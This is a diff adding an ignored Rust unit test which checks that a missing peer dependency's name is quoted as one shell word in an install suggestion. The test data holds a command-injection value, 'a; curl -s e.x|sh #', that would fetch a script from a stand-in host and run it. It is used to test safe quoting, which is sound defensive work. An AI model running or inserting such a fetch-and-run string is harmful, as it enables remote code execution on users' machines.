@@ -96,6 +96,23 @@ mod tests {
     }
 
     #[test]
+    #[ignore = "flipped by T6"]
+    fn a_missing_peer_is_named_as_one_shell_word() {
+        let declared = PeerDependency {
+            name: "a; curl -s e.x|sh #".into(),
+            version: "^1.0".into(),
+            optional: false,
+        };
+
+        let d = of("@evilcorpx/formal", &declared, &Verdict::Missing).unwrap();
+
+        assert_eq!(
+            d.suggestion.as_deref(),
+            Some("install it with: specforge add 'a; curl -s e.x|sh #'")
+        );
+    }
+
+    #[test]
     fn each_verdict_has_its_code_and_suggestion() {
         assert!(report("^1.0", Some("1.2.0")).is_none());
 
